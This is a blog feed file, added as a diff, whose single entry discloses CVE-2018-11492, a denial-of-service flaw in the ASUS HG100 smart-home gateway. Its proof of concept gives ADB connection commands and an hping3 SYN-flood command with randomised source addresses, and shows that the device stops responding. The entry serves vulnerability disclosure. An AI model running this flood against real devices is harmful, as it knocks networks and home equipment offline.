@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://0.0.0.0:4000/marscheng/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/marscheng/" rel="alternate" type="text/html" /><updated>2018-07-25T17:23:32+08:00</updated><id>http://0.0.0.0:4000/marscheng/</id><title type="html">Mars cheng blog</title><subtitle>Welcome to Mars's blog.
+</subtitle><entry><title type="html">CVE-2018-11492</title><link href="http://0.0.0.0:4000/marscheng/2018/CVE-2018-11492/" rel="alternate" type="text/html" title="CVE-2018-11492" /><published>2018-07-25T00:00:00+08:00</published><updated>2018-07-25T00:00:00+08:00</updated><id>http://0.0.0.0:4000/marscheng/2018/CVE-2018-11492</id><content type="html" xml:base="http://0.0.0.0:4000/marscheng/2018/CVE-2018-11492/">&lt;h2 id=&quot;-asus-hg100-exists-dos-vulnerability-&quot;&gt;&lt;strong&gt;&lt;center&gt; ASUS HG100 exists DoS vulnerability &lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;
+&lt;h4 id=&quot;descriptionasus-hg100-devices-allow-denial-of-service-via-an-ipv4-packet-flood&quot;&gt;Description:ASUS HG100 devices allow denial of service via an IPv4 packet flood.&lt;/h4&gt;
+
+&lt;h4 id=&quot;this-vulnerability-was-discovered-by-national-center-for-cyber-security-technology-nccst&quot;&gt;This vulnerability was discovered by &lt;strong&gt;National Center for Cyber Security Technology (NCCST)&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div style=&quot;text-align: center&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/S5EAPKv.png&quot; /&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introduction-of-asus-hg100-smarthome-gateway&quot;&gt;&lt;center&gt;Introduction of ASUS HG100 SmartHome GateWay&lt;/center&gt;&lt;/h2&gt;
+&lt;div style=&quot;text-align: center&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/xkfNTTu.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Length x width x height&lt;/th&gt;
+      &lt;th&gt;Weight&lt;/th&gt;
+      &lt;th&gt;Wireless connection&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;152 x 67 x 167 mm&lt;/td&gt;
+      &lt;td&gt;256g&lt;/td&gt;
+      &lt;td&gt;WiFi 802.11b/g/n ; ZigBee PRO ; BlueTooth 4.0&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;proof-of-concept&quot;&gt;&lt;center&gt;Proof of Concept&lt;/center&gt;&lt;/h2&gt;
+
+&lt;h3 id=&quot;1connect-to-asus-gateway-hg100-with-adb&quot;&gt;1.Connect to ASUS Gateway HG100 with ADB&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb connect 192.168.0.108
+adb shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/lVNHkeH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2execute-ip-v4-flood-attack&quot;&gt;2.Execute IP v4 flood attack&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Use Hping3 tool to execute DoS attack
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hping3 -V -c 1000000 -d 120 -S -w 64 --flood --rand-source 192.168.0.108
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Confirm packets status&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div style=&quot;text-align: center&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/cGHgMYi.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;3confirm-device-status&quot;&gt;3.Confirm device status&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Unable to connect to ADB, and DoS attack success.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div style=&quot;text-align: center&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/CUnM7mQ.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;-notice-asus-cant-fix-this-vulnerability-r&quot;&gt;&lt;strong&gt;&lt;center&gt; Notice: ASUS can't fix this vulnerability r&lt;/center&gt;&lt;/strong&gt;&lt;/h3&gt;</content><author><name>Mars Cheng</name></author><category term="CVE" /><summary type="html">ASUS HG100 exists DoS vulnerability Description:ASUS HG100 devices allow denial of service via an IPv4 packet flood.</summary></entry></feed>
